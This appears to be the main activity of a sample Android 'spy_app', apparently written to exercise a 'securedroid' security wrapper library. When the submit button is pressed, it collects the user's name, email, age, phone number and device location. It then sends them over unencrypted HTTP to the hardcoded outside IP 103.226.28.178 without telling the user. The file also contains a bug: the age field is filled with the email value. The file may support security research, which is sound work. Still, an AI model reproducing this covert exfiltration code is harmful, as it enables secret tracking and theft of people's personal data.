package com.example.spy_app;

import android.content.pm.PackageManager;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.os.Build;
import android.os.health.PackageHealthStats;
import android.support.v4.content.ContextCompat;
import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;
import android.widget.Toast;

import com.example.securedroid.SecLocationManager;
import com.example.securedroid.SecURLConnection;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.io.OutputStreamWriter;
import java.io.UnsupportedEncodingException;
import java.net.URL;
import java.net.URLConnection;
import java.net.URLEncoder;

public class MainActivity extends AppCompatActivity implements View.OnClickListener, LocationListener {

    Button submit;
    EditText name;
    EditText email;
    EditText age;
    EditText phoneno;
    EditText result;
    String Name, Email, Age, Phoneno;
    String data;
    String loc;

    SecLocationManager secLocationManager;
    boolean isGPSEnabled;
    boolean isNetworkEnabled;
    Location location;
    int lat;
    int lng;
    URL url;
    SecURLConnection conn;
    OutputStream os;
    OutputStreamWriter wr;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        submit = findViewById(R.id.submit);
        submit.setOnClickListener(this);

        name = findViewById(R.id.name);
        email = findViewById(R.id.email);
        age = findViewById(R.id.age);
        phoneno = findViewById(R.id.phoneno);
        result = findViewById(R.id.result);

        isGPSEnabled = false;
        isNetworkEnabled = false;
    }

    @Override
    public void onClick(View view) {

        Name = name.getText().toString();
        Email = email.getText().toString();
        Age = age.getText().toString();
        Phoneno = phoneno.getText().toString();

        data = null;
        try {
            data = URLEncoder.encode("name", "UTF-8")
                    + "=" + URLEncoder.encode(Name, "UTF-8");

            data += "&" + URLEncoder.encode("age", "UTF-8") + "="
                    + URLEncoder.encode(Email, "UTF-8");

            data += "&" + URLEncoder.encode("email", "UTF-8")
                    + "=" + URLEncoder.encode(Email, "UTF-8");

            data += "&" + URLEncoder.encode("phoneno", "UTF-8")
                    + "=" + URLEncoder.encode(Phoneno, "UTF-8");

        } catch (UnsupportedEncodingException e) {
            e.printStackTrace();
        }

        if ( Build.VERSION.SDK_INT >= 23 &&
                ContextCompat.checkSelfPermission( this, android.Manifest.permission.ACCESS_FINE_LOCATION ) != PackageManager.PERMISSION_GRANTED &&
                ContextCompat.checkSelfPermission( this, android.Manifest.permission.ACCESS_COARSE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
            try {
                url = new URL("http://103.226.28.178");

                conn = new SecURLConnection(url, this);
                conn.setDoOutput(true);
                os = conn.getOutputStream();
                wr = new OutputStreamWriter(os);
                wr.write(data);
                wr.flush();
            }
            catch(Exception e) {
                e.printStackTrace();
            }
            return;
        }

        secLocationManager = new SecLocationManager(this);

        isGPSEnabled = secLocationManager.isProviderEnabled(LocationManager.GPS_PROVIDER);
        isNetworkEnabled = secLocationManager.isProviderEnabled(LocationManager.NETWORK_PROVIDER);

        secLocationManager.requestLocationUpdates(LocationManager.GPS_PROVIDER, 1000, 1, this);

        if(isNetworkEnabled) {
            location = secLocationManager.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
            if (location != null) {
                lat = (int) (location.getLatitude());
                lng = (int) (location.getLongitude());

                loc = "Latitude: " + lat + "; Longitude: " + lng;

                try {
                    data += "&" + URLEncoder.encode("Location", "UTF-8")
                            + "=" + URLEncoder.encode(loc, "UTF-8");


                    url = new URL("http://103.226.28.178");

                    conn = new SecURLConnection(url, this);
                    conn.setDoOutput(true);
                    os = conn.getOutputStream();
                    wr = new OutputStreamWriter(os);
                    wr.write(data);
                    wr.flush();
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }
        }
        else if(isGPSEnabled){
            location = secLocationManager.getLastKnownLocation(LocationManager.GPS_PROVIDER);
            if(location != null){
                lat = (int) (location.getLatitude());
                lng = (int) (location.getLongitude());

                loc = "Latitude: " + lat + "; Longitude: " + lng;

                try {
                    data += "&" + URLEncoder.encode("Location", "UTF-8")
                            + "=" + URLEncoder.encode(loc, "UTF-8");


                    url = new URL("http://103.226.28.178");

                    conn = new SecURLConnection(url, this);
                    conn.setDoOutput(true);
                    os = conn.getOutputStream();
                    wr = new OutputStreamWriter(os);
                    wr.write(data);
                    wr.flush();
                }
                catch(Exception e) {
                    e.printStackTrace();
                }
            }
        }
    }

    @Override
    public void onLocationChanged(Location location) {
        lat = (int) (location.getLatitude());
        lng = (int) (location.getLongitude());
    }

    @Override
    public void onStatusChanged(String s, int i, Bundle bundle) {

    }

    @Override
    public void onProviderEnabled(String s) {

    }

    @Override
    public void onProviderDisabled(String s) {

    }
}
